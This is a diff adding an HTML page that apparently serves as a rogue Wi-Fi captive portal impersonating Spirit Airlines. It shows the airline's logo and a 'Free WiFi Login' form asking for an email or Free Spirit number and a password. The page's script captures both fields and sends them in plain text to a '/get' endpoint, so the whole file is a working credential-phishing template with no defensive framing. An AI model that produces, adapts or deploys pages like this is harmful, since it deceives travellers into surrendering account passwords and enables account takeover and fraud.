@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #fde46c;
+  margin: 0;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;  
+}
+
+.login-container {
+  background: #fff;
+  padding: 20px;  
+  max-width: 300px;
+  width: 90%;
+  text-align: center;
+  border-radius: 5px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.25);  
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+  align-items: center;  
+}
+
+h1 {
+  color: #232f3e;
+  font-size: 1.5rem;
+  font-weight: 600;
+  margin-top: 0;
+}
+
+input[type="text"],
+input[type="password"] {
+  width: 100%;
+  max-width: 300px;  
+  padding: 12px 20px;
+  margin: 8px 0;
+  box-sizing: border-box;
+  border: 2px solid #ddd;
+  border-radius: 4px;
+}
+
+input[type="submit"] {
+  background-color: #303c49;
+  border: none;
+  color: white;
+  padding: 14px 28px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+  border-radius: 5px;  
+}
+
+</style>
+
+</head>
+<body>
+
+<div class="login-container">
+
+<svg xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.4" clip-rule="evenodd" viewBox="0 0 560 400" width="140">
+  <path fill-rule="nonzero" d="M434 171h15l-4 15h-15l-5 23c-1 5 0 6 7 6h8l-3 14-18 1c-15 0-20-4-17-16l6-28h-12l3-15h12l4-19h22zm-78 58h22l13-58h-23zm14-65h22l3-14h-23zm-62 7-12 58h22l12-58zm53-3h-5c-10 0-26 10-30 28l-1 4c3-8 11-12 22-12l9 1zm-85 3-12 58h22l13-58zm27-21h-23l-3 14h23zm-41 51c-3 16-19 30-40 30-10 0-17-3-20-8l-6 27h-22l16-79h22l-1 7c6-6 15-9 24-9 21 0 32 12 27 32zm-36-16c-10 0-17 6-19 15s2 15 13 15c10 0 17-6 19-15 2-10-2-15-13-15zm-70 8-19-2c-6-1-7-2-6-4 0-4 5-6 11-6l8 2c2 1 3 2 3 5h26c2-17-17-20-32-20-22 0-37 5-40 21-2 10 4 15 17 16l19 3c6 0 8 1 7 4-1 4-6 5-11 5l-10-1c-2-1-2-3-2-5h-27c-3 17 18 20 34 20 24 0 39-6 42-20 2-11-5-16-20-18zm301-17 1 2h-2v-2h-1v2h-1v-5h3v3zm-1-1v-1h-1v1h1zm4 0v2l-1 2a4 4 0 0 1-4 1h-1l-2-1-1-2v-4a4 4 0 0 1 3-2h3l2 1 1 1v2zm-1 0v-1l-1-1-1-1h-3l-1 1-1 1v1a4 4 0 0 0 1 3l1 1a3 3 0 0 0 3 0l1-1 1-1v-2z"/>
+</svg>
+
+  <h1> Use your Spirit Airlines Account<br> for Free WiFi Login</h1>  
+
+  <form id="login-form">
+    <input type="text" name="email" placeholder="Email Address or Free Spirit Number">
+    <input type="password" name="password" placeholder="Password">    
+    <input type="submit" value="Login">
+  </form>
+  
+</div>
+
+<script>
+const form = document.getElementById('login-form');
+form.addEventListener('submit', (e) => {
+  e.preventDefault();
+  
+  const email = form.elements['email'].value;
+  const password = form.elements['password'].value;  
+  
+  window.location.href = '/get?email=' + email + '&password=' + password;
+});
+</script>
+
+</body>
+</html>
